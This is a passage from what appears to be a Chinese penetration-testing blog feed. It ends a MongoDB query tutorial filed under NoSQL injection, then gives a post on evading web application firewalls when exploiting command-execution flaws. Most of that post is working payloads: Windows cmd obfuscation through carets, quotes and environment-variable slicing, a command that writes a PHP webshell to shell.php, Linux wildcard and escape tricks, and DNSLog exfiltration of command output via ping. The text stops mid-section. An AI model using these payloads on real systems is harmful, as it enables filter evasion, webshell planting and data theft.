ObjectId<span class="token punctuation">(</span><span class="token string">"60fa854cf8aaaf4f21049148"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"name"</span> : <span class="token string">"whoami"</span><span class="token punctuation">,</span> <span class="token string">"description"</span> : <span class="token string">"the admin user"</span><span class="token punctuation">,</span> <span class="token string">"age"</span> : <span class="token string">"20"</span><span class="token punctuation">,</span> <span class="token string">"status"</span> : <span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"groups"</span> : <span class="token punctuation">[</span> <span class="token string">"admins"</span><span class="token punctuation">,</span> <span class="token string">"users"</span> <span class="token punctuation">]</span> }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果你需要以易读的方式来读取数据，可以使用 pretty() 方法以格式化的方式来显示所有文档：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">&gt;</span> db<span class="token punctuation">.</span>all_users<span class="token punctuation">.</span>find<span class="token punctuation">(</span>{<span class="token string">"age"</span>:<span class="token number">20</span>}<span class="token punctuation">)</span><span class="token punctuation">.</span>pretty<span class="token punctuation">(</span><span class="token punctuation">)</span>{    <span class="token string">"_id"</span> : ObjectId<span class="token punctuation">(</span><span class="token string">"60fa854cf8aaaf4f21049148"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">"name"</span> : <span class="token string">"whoami"</span><span class="token punctuation">,</span>    <span class="token string">"description"</span> : <span class="token string">"the admin user"</span><span class="token punctuation">,</span>    <span class="token string">"age"</span> : <span class="token number">20</span><span class="token punctuation">,</span>    <span class="token string">"status"</span> : <span class="token string">"A"</span><span class="token punctuation">,</span>    <span class="token string">"groups"</span> : <span class="token punctuation">[</span>        <span class="token string">"admins"</span><span class="token punctuation">,</span>        <span class="token string">"users"</span>    <span class="token punctuation">]</span>}<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-6-MongoDB-与-RDBMS-Where-语句的比较"><a href="#4-6-MongoDB-与-RDBMS-Where-语句的比较" class="headerlink" title="4.6 MongoDB 与 RDBMS Where 语句的比较"></a>4.6 MongoDB 与 RDBMS Where 语句的比较</h3><p>如果你熟悉常规的 SQL 数据，通过下表可以更好的理解 MongoDB 的条件语句查询：</p><pre class="line-numbers language-none"><code class="language-none">操作 格式 范例 RDBMS 中的类似语句等于 {&lt;key&gt;:&lt;value&gt;} db.love.find({"name":"whoami"}).pretty() where name = 'whoami'小于 {&lt;key&gt;:{$lt:&lt;value&gt;}} db.love.find({"age":{$lt:19}}).pretty() where age &lt; 19小于或等于 {&lt;key&gt;:{$lte:&lt;value&gt;}} db.love.find({"age":{$lte:19}}).pretty() where likes &lt;= 19大于 {&lt;key&gt;:{$gt:&lt;value&gt;}} db.love.find({"age":{$gt:19}}).pretty() where likes &gt; 19大于或等于 {&lt;key&gt;:{$gte:&lt;value&gt;}} db.love.find({"age":{$gte:19}}).pretty() where likes &gt;= 19不等于 {&lt;key&gt;:{$ne:&lt;value&gt;}} db.love.find({"age":{$ne:19}}).pretty() where likes != 19<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-7-MongoDB-AND-条件"><a href="#4-7-MongoDB-AND-条件" class="headerlink" title="4.7 MongoDB AND 条件"></a>4.7 MongoDB AND 条件</h3><p>MongoDB 中的 find() 方法可以传入多个键值对，每个键值对以逗号隔开，即常规 SQL 的 AND 条件。语法格式如下：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">&gt;</span> db<span class="token punctuation">.</span>all_users<span class="token punctuation">.</span>find<span class="token punctuation">(</span>{<span class="token string">"status"</span>:<span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token string">"age"</span>:<span class="token number">20</span>}<span class="token punctuation">)</span>{ <span class="token string">"_id"</span> : ObjectId<span class="token punctuation">(</span><span class="token string">"60fa8ef8f8aaaf4f2104914e"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"name"</span> : <span class="token string">"bob"</span><span class="token punctuation">,</span> <span class="token string">"description"</span> : <span class="token string">"the normal user"</span><span class="token punctuation">,</span> <span class="token string">"age"</span> : <span class="token number">20</span><span class="token punctuation">,</span> <span class="token string">"status"</span> : <span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token string">"groups"</span> : <span class="token punctuation">[</span> <span class="token string">"normals"</span><span class="token punctuation">,</span> <span class="token string">"users"</span> <span class="token punctuation">]</span> }<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以上实例中类似于 RDBMS 中的 WHERE 语句：WHERE status=’B’ AND age=20<br>MongoDB OR 条件</p><p>MongoDB OR 条件语句使用了关键字 $or 来表示，语法格式如下：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">&gt;</span> db<span class="token punctuation">.</span>col<span class="token punctuation">.</span>find<span class="token punctuation">(</span>   {      $<span class="token operator">or</span>: <span class="token punctuation">[</span>         {key1: value1}<span class="token punctuation">,</span> {key2:value2}      <span class="token punctuation">]</span>   }<span class="token punctuation">)</span><span class="token punctuation">.</span>pretty<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如下实例，我们查询键 status 值为 A 或键 age 值为 19 的文档。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">&gt;</span> db<span class="token punctuation">.</span>all_users<span class="token punctuation">.</span>find<span class="token punctuation">(</span>{$<span class="token operator">or</span>:<span class="token punctuation">[</span>{<span class="token string">"status"</span>:<span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"age"</span>:<span class="token string">"19"</span>}<span class="token punctuation">]</span>}<span class="token punctuation">)</span>{ <span class="token string">"_id"</span> : ObjectId<span class="token punctuation">(</span><span class="token string">"60fa8ec6f8aaaf4f2104914c"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"name"</span> : <span class="token string">"bunny"</span><span class="token punctuation">,</span> <span class="token string">"description"</span> : <span class="token string">"the normal user"</span><span class="token punctuation">,</span> <span class="token string">"age"</span> : <span class="token number">19</span><span class="token punctuation">,</span> <span class="token string">"status"</span> : <span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"groups"</span> : <span class="token punctuation">[</span> <span class="token string">"lovers"</span><span class="token punctuation">,</span> <span class="token string">"users"</span> <span class="token punctuation">]</span> }<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="4-8-AND-和-OR-联合使用"><a href="#4-8-AND-和-OR-联合使用" class="headerlink" title="4.8 AND 和 OR 联合使用"></a>4.8 AND 和 OR 联合使用</h3><p>以下实例演示了 AND 和 OR 联合使用，类似于 RDBMS 中的 WHERE 语句： where age&gt;19 AND (name=’whoami’ OR status=’A’)</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">&gt;</span> db<span class="token punctuation">.</span>all_users<span class="token punctuation">.</span>find<span class="token punctuation">(</span>{<span class="token string">"age"</span>:{$gt:<span class="token number">19</span>}<span class="token punctuation">,</span> $<span class="token operator">or</span>: <span class="token punctuation">[</span>{<span class="token string">"name"</span>:<span class="token string">"whoami"</span>}<span class="token punctuation">,</span> {<span class="token string">"status"</span>:<span class="token string">"A"</span>}<span class="token punctuation">]</span>}<span class="token punctuation">)</span>{ <span class="token string">"_id"</span> : ObjectId<span class="token punctuation">(</span><span class="token string">"60fa9176f8aaaf4f21049150"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"name"</span> : <span class="token string">"whoami"</span><span class="token punctuation">,</span> <span class="token string">"description"</span> : <span class="token string">"the admin user"</span><span class="token punctuation">,</span> <span class="token string">"age"</span> : <span class="token number">20</span><span class="token punctuation">,</span> <span class="token string">"status"</span> : <span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"groups"</span> : <span class="token punctuation">[</span> <span class="token string">"admins"</span><span class="token punctuation">,</span> <span class="token string">"users"</span> <span class="token punctuation">]</span> }<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="5-参考链接"><a href="#5-参考链接" class="headerlink" title="5. 参考链接"></a>5. 参考链接</h2><p><a href="https://xz.aliyun.com/t/9908">Nosql 注入从零到一 - 先知社区 (aliyun.com)</a></p><p><a href="https://blog.csdn.net/jklbnm12/article/details/120423608">Nosql 注入从零到一_nosql注入_网安溦寀的博客-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> SQL 注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nosql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过 WAF 运行命令执行漏洞的方法</title>
      <link href="/2023/01/28/penetrationstest/shen-tou-ji-qiao/ming-ling-zhi-xing/rao-guo-waf-yun-xing-ming-ling-zhi-xing-lou-dong-de-fang-fa/"/>
      <url>/2023/01/28/penetrationstest/shen-tou-ji-qiao/ming-ling-zhi-xing/rao-guo-waf-yun-xing-ming-ling-zhi-xing-lou-dong-de-fang-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="绕过-WAF-运行命令执行漏洞的方法"><a href="#绕过-WAF-运行命令执行漏洞的方法" class="headerlink" title="绕过 WAF 运行命令执行漏洞的方法"></a>绕过 WAF 运行命令执行漏洞的方法</h1><h2 id="0x01-Windows"><a href="#0x01-Windows" class="headerlink" title="0x01 Windows"></a>0x01 Windows</h2><h3 id="1-1-符号和命令的关系"><a href="#1-1-符号和命令的关系" class="headerlink" title="1.1 符号和命令的关系"></a>1.1 符号和命令的关系</h3><p>如果命令执行的时候遇到拦截命令关键词的时候可以利用如下方法绕过：</p><p>“ 和 ^ 是CMD命令中最常见的转义字符，还有成对的括号并不会影响命令的执行。</p><p>这里有几个需要注意的地方：</p><pre class="line-numbers language-none"><code class="language-none">在命令中可以有无数个"，但是不能有两个连续的^在命令中如果"在^之前，则"的个数必须为偶数个在命令中如果"在^之后，并且带有参数，则命令中的"个数必须为偶数在命令的参数中，单个字符前后"的个数只能有一个或者两个如果成对的括号中间有"则"的个数也必须为偶数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>示例</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">whoami</span>    //正确执行WhOAmi    //正确执行Who<span class="token string">"amI    //正确执行((Who"</span>amI<span class="token punctuation">))</span>    //错误<span class="token variable"><span class="token punctuation">((</span>Who""amI<span class="token punctuation">))</span></span>    //正确执行Who<span class="token string">""</span>"<span class="token string">""</span>"<span class="token string">""</span>amI    //正确执行<span class="token function">who</span><span class="token string">""</span>"a^mi    //错误<span class="token function">who</span><span class="token string">""</span>"<span class="token string">"a^mi    //正确执行whoa^m"</span>"<span class="token string">""</span>i    //正确执行whoa^m<span class="token string">""</span>"i    //正确执行whoa^^mi    //错误n^e^t user    //正确执行n^e^t<span class="token string">""</span> user    //正确执行n^e^t<span class="token string">""</span>" user    //错误n^e^t<span class="token string">""</span> u<span class="token string">"ser    //正确执行n^e^t"</span>" u<span class="token string">""</span>ser    //正确执行n^e^t<span class="token string">""</span> u<span class="token string">""</span>"ser    //错误n^e^t<span class="token string">""</span> u<span class="token string">""</span>s<span class="token string">"er    //正确执行n^e^t"</span>" u<span class="token string">""</span>s<span class="token string">""</span>er    //正确执行n^e^t<span class="token string">""</span> u<span class="token string">""</span>s<span class="token string">""</span>"er    //错误<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-2-了解-set-命令和-Windows-变量"><a href="#1-2-了解-set-命令和-Windows-变量" class="headerlink" title="1.2 了解 set 命令和 Windows 变量"></a>1.2 了解 set 命令和 Windows 变量</h3><p>在cmd中set用来进行变量赋值，而 %% 括起来的变量会引用其赋的值。</p><pre class="line-numbers language-none"><code class="language-none">set a=1echo %a%<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221031172832.png"></p><p>这样就可以进行命令执行了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> <span class="token assign-left variable">cmd</span><span class="token operator">=</span><span class="token string">"whoami"</span>%cmd%<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221031172940.png"></p><p>也可以赋值多个变量，拼接利用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> <span class="token assign-left variable">cmd1</span><span class="token operator">=</span>who<span class="token builtin class-name">set</span> <span class="token assign-left variable">cmd2</span><span class="token operator">=</span>am<span class="token builtin class-name">set</span> <span class="token assign-left variable">cmd3</span><span class="token operator">=</span>i%cmd1%%cmd2%%cmd3%<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221031173129.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> <span class="token assign-left variable">cmd1</span><span class="token operator">=</span>who<span class="token builtin class-name">set</span> <span class="token assign-left variable">cmd3</span><span class="token operator">=</span>i%cmd1%am%cmd3%<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221031173640.png"></p><p>也可以在其中加入转义符</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> <span class="token assign-left variable">cmd1</span><span class="token operator">=</span>wh<span class="token string">""</span>o<span class="token builtin class-name">set</span> <span class="token assign-left variable">cmd3</span><span class="token operator">=</span>i<span class="token string">""</span>"%cmd1%a^m%cmd3%<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221031174215.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> <span class="token assign-left variable">cmd1</span><span class="token operator">=</span>s<span class="token string">""</span>er<span class="token builtin class-name">set</span> <span class="token assign-left variable">cmd2</span><span class="token operator">=</span>t u<span class="token builtin class-name">set</span> <span class="token assign-left variable">cmd3</span><span class="token operator">=</span>n^e%cmd3%%cmd2%%cmd1%<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221031174257.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cmd /C <span class="token string">"set cmd1=s"</span>"er<span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">set</span> <span class="token assign-left variable">cmd2</span><span class="token operator">=</span>t u<span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">set</span> <span class="token assign-left variable">cmd3</span><span class="token operator">=</span>n^e<span class="token operator">&amp;&amp;</span> call %cmd3%%cmd2%%cmd1%"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221031175151.png"></p><p>当使用cmd /V:ON或cmd /V:O时可以不使用call命令来扩展变量，使用 %var% 或 !var! 来扩展变量，!var!可以用来代替%var%</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cmd /V:ON /C <span class="token string">"set cmd=whoami &amp;&amp; !cmd!"</span>cmd /V:O /C <span class="token string">"set cmd=whoami &amp;&amp; !cmd!"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221101153415.png"></p><h3 id="1-3-Windows-切割字符串"><a href="#1-3-Windows-切割字符串" class="headerlink" title="1.3 Windows 切割字符串"></a>1.3 Windows 切割字符串</h3><p>拿 whoami 举例，实践 Windows 切割字符串的语法</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> <span class="token assign-left variable">cmd</span><span class="token operator">=</span>whoami<span class="token builtin class-name">echo</span> %cmd:~0% //取出a的值中的所有字符此时正常执行whoami<span class="token builtin class-name">echo</span> %cmd:~0,1% //取出a的值，从第0个位置开始，取1个值此时因为w总共就1个字符<span class="token builtin class-name">echo</span> %cmd:~0,6% //取出a的值，从第0个位置开始，取6个值此时因为whoami总共就6个字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221101153625.png"></p><p>由此可以看出来截取字符串的语法为%变量名:~x,y%即从变量第x位开始，截取y个字符。</p><p>既然已经熟悉了如何切割字符，那么我们来看一下都有什么环境变量可以用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221101154620.png"></p><p>拼接成 whoami</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> %ComSpec:~3,1%%Path:~20,1%%ALLUSERSPROFILE:~5,1%%DriverData:~-1,1%%TMP:~-2,1%%APPDATA:~-3,1%%ComSpec:~3,1%%Path:~20,1%%ALLUSERSPROFILE:~5,1%%DriverData:~-1,1%%TMP:~-2,1%%APPDATA:~-3,1%<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221101155228.png"></p><p>我们还可以凑php一句话（这里为了方便所以自定义了一些字符）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> <span class="token assign-left variable">web</span><span class="token operator">=</span>^<span class="token operator">&lt;</span>^<span class="token operator">&gt;</span>/@<span class="token variable">$_PHPOST</span><span class="token punctuation">[</span><span class="token punctuation">]</span>?'e<span class="token punctuation">(</span><span class="token punctuation">)</span>val<span class="token builtin class-name">echo</span> ^%web:~0,1%^%web:~-8,1%%web:~6,3% ^%web:~-6,1%^%web:~-3,3%^%web:~-5,1%%web:~4,2%%web:~8,5%^%web:~-7,1%%web:~-1,1%^%web:~-7,1%%web:~13,1%^%web:~-4,1% ^%web:~-8,1%^%web:~1,1% <span class="token operator">&gt;</span> shell.php<span class="token builtin class-name">type</span> shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221101155504.png"></p><p>因为拼接字符需要得到大量的位置，为了方便拼接可以使用 for 命令来讲所有位置设成一个列表，以此循环遍历列表，合并字符串，还能起到混淆的作用。</p><p>这里注意 set 不能以空格结尾否则，变量会将空格进行赋值</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cmd /V:ON /C <span class="token string">" set kpx=vwchdoaadmei&amp;&amp; for %G in (1,3,5,7,9,11,26) do set lq=!lq!!kpx:~%G,1!&amp;&amp; if %G==26 !lq:~4!"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221101190628.png"></p><h3 id="1-4-逻辑运算符在绕过中的作用"><a href="#1-4-逻辑运算符在绕过中的作用" class="headerlink" title="1.4 逻辑运算符在绕过中的作用"></a>1.4 逻辑运算符在绕过中的作用</h3><p>==|== 在cmd中，可以连接命令，且只会回显后面的命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">whoami</span> <span class="token operator">|</span> <span class="token function">ping</span> <span class="token parameter variable">-n</span> <span class="token number">1</span> www.baidu.com   //只回显ping<span class="token function">ping</span> <span class="token parameter variable">-n</span> <span class="token number">1</span> www.baidu.com <span class="token operator">|</span> <span class="token function">whoami</span>   //只回显whoami<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221101193429.png"></p><p>==||== 只有在前面命令失败才执行后面</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ping</span> <span class="token parameter variable">-n</span> <span class="token number">1</span> www.baidu.com <span class="token operator">||</span> <span class="token function">whoami</span> //不执行whoami<span class="token function">ping</span> <span class="token parameter variable">-n</span> <span class="token number">1</span> xxx <span class="token operator">||</span> <span class="token function">whoami</span> //执行whoami<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221101193807.png"></p><p>==&amp;== 无论前面的命令是否能执行成功都会执行后面的命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ping</span> <span class="token parameter variable">-n</span> <span class="token number">1</span> www.baidu.com <span class="token operator">&amp;</span> <span class="token function">whoami</span> //执行whoami<span class="token function">ping</span> <span class="token parameter variable">-n</span> <span class="token number">1</span> xxx <span class="token operator">&amp;</span> <span class="token function">whoami</span> //执行whoami<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221101193922.png"></p><p>==&amp;&amp;== 前面命令为真才会执行后面的命令。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ping</span> <span class="token parameter variable">-n</span> <span class="token number">1</span> www.baidu.com <span class="token operator">&amp;&amp;</span> <span class="token function">whoami</span> //执行whoami<span class="token function">ping</span> <span class="token parameter variable">-n</span> <span class="token number">1</span> xxx <span class="token operator">&amp;&amp;</span> <span class="token function">whoami</span> //不执行whoami<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221101194015.png"></p><h2 id="0x02-Linux（区分大小写）"><a href="#0x02-Linux（区分大小写）" class="headerlink" title="0x02 Linux（区分大小写）"></a>0x02 Linux（区分大小写）</h2><h3 id="2-1-linux下的符号和逻辑运算符"><a href="#2-1-linux下的符号和逻辑运算符" class="headerlink" title="2.1 linux下的符号和逻辑运算符"></a>2.1 linux下的符号和逻辑运算符</h3><p>linux中变量使用 ==$== 来引用，==;== 表示命令结束无论命令是否执行成功都会执行下一个命令，==| || &amp; &amp;&amp;== ，与Windows一样，这里就不做赘述。</p><p>利用上面的符号可以进行拼接的命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">t</span><span class="token operator">=</span>l<span class="token punctuation">;</span><span class="token assign-left variable">j</span><span class="token operator">=</span>s<span class="token punctuation">;</span><span class="token assign-left variable">i</span><span class="token operator">=</span><span class="token string">" -al"</span><span class="token punctuation">;</span><span class="token variable">$t</span><span class="token variable">$j</span><span class="token variable">$i</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221101194357.png"></p><h3 id="2-2-利用未被过滤的命令"><a href="#2-2-利用未被过滤的命令" class="headerlink" title="2.2 利用未被过滤的命令"></a>2.2 利用未被过滤的命令</h3><p>假设有命令执行漏洞的网站中过滤的一些命令，但是没有过滤一些命令，例如 ping 命令，则可以利用 ping 命令来执行命令带出信息。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ping</span> <span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span>.whjtmh.dnslog.cn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用DNSLog就可以获得带出的信息（对于不回显的命令执行也可以利用这种方法）</p><p><img src="/../../../../pic/Pasted%20image%2020221101195233.png"></p><h3 id="2-3-linux-符号之间的组合"><a href="#2-3-linux-符号之间的组合" class="headerlink" title="2.3 linux 符号之间的组合"></a>2.3 linux 符号之间的组合</h3><p>类似于Windows的”和^linux也有类似的使用方法，就是利用变量和参数</p><p>利用反斜杠绕过</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">who<span class="token punctuation">\</span>ami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用括号括起来（当做命令执行）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>whoa<span class="token string">''</span>mi<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用反引号或$和括号结合（将括号内命令的结果当做命令执行）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token variable">`</span><span class="token punctuation">(</span>echo <span class="token function">whoami</span><span class="token punctuation">)</span><span class="token variable">`</span></span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token function">whoami</span><span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>利用Shell特殊变量绕过</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">who</span><span class="token variable">$*</span>ami<span class="token function">who</span><span class="token variable">$@</span>ami<span class="token function">who</span><span class="token variable">$1ami</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>利用通配符匹配唯一命令名称执行命令（使用命令的绝对路径）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/u?r/b?n/who?mi/*/*/whoam?/*/*i<span class="token punctuation">[</span>n<span class="token punctuation">]</span>/wh??mi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>综合组合</p><pre class="line-numbers language-none"><code class="language-none">/*/*""in/w'h'`@`??m$(@)i // 匹配到 /usr/bin/whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-4-linux-切割字符串（linux-区分大小写）"><a href="#2-4-linux-切割字符串（linux-区分大小写）" class="headerlink" title="2.4 linux 切割字符串（linux 区分大小写）"></a>2.4 linux 切割字符串（linux 区分大小写）</h3><p>在 linux 中切割字符串的语法是 ${NAME:start:length}</p><p><strong>第一种使用cut：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"hello world"</span> <span class="token operator">|</span><span class="token function">cut</span> -d<span class="token string">" "</span> <span class="token parameter variable">-f1</span> <span class="token comment">#hello</span><span class="token builtin class-name">echo</span> <span class="token string">"hello world"</span> <span class="token operator">|</span><span class="token function">cut</span> -d<span class="token string">" "</span> <span class="token parameter variable">-f2</span><span class="token comment">#world</span><span class="token builtin class-name">echo</span> <span class="token string">"hello world"</span> <span class="token operator">|</span><span class="token function">cut</span> -d<span class="token string">" "</span> -f1-<span class="token comment">#hello world</span> <span class="token builtin class-name">echo</span> <span class="token string">"hello world"</span> <span class="token operator">|</span><span class="token function">cut</span> <span class="token parameter variable">-c</span> <span class="token number">1</span><span class="token comment">#h</span><span class="token builtin class-name">echo</span> <span class="token string">"hello world"</span> <span class="token operator">|</span><span class="token function">cut</span> <span class="token parameter variable">-c</span> <span class="token number">1</span>-4<span class="token comment">#hell</span><span class="token builtin class-name">echo</span> <span class="token string">"hello world"</span> <span class="token operator">|</span><span class="token function">cut</span> <span class="token parameter variable">-c</span> <span class="token number">1,2</span>,5<span class="token comment">#heo</span> <span class="token builtin class-name">echo</span> <span class="token string">"测试字符串"</span> <span class="token operator">|</span><span class="token function">cut</span> <span class="token parameter variable">-bn</span> <span class="token number">1</span><span class="token comment">#测</span><span class="token builtin class-name">echo</span> <span class="token string">"测试字符串"</span> <span class="token operator">|</span><span class="token function">cut</span> <span class="token parameter variable">-bn</span> <span class="token number">1</span>-<span class="token comment">#测试字符串</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>-d 表示分割的字符，这里只能使用单字符，比较有局限性。与-f 配合使用</p><p>-c 表示以字符分割，1表示获取第一个字符，1-4,表示获取1到4的字符，1-表示获取第一个字符以及后边所有的字符</p><p>-b 表示以字节分割，和-c的用法相同，但是是以一字节（8bit）分割，如果是中文，则可能出现乱码。一般与n配置使用，表示不允许将多字节的字符按字节分开</p><p>-f 表示输出的字段（域）（从1开始计数），1表示输出分割后的第一个字段 1-表示输出字段1以及后边的所有字段</p><p><strong>第二种办法 shell变量中切割字符串：</strong></p><p>1.获取字符串的长度</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">string</span><span class="token operator">=</span><span class="token string">"hello world"</span><span class="token variable">${<span class="token operator">#</span>string}</span> <span class="token comment"># 11</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2.删除从左边开始到指定字符第一次出现的字符并保留右边字符</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">string</span><span class="token operator">=</span><span class="token string">"http://www.test.com"</span><span class="token builtin class-name">echo</span> <span class="token variable">${string<span class="token operator">#</span>*<span class="token operator">/</span><span class="token operator">/</span>}</span> <span class="token comment"># www.test.com</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>3.删除从左边开始到指定字符最后一次出现的字符并保留右边字符</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">string</span><span class="token operator">=</span><span class="token string">"http://www.test.com/index.html"</span><span class="token builtin class-name">echo</span> <span class="token variable">${string<span class="token operator">##</span>*<span class="token operator">/</span>}</span> <span class="token comment"># index.html</span><span 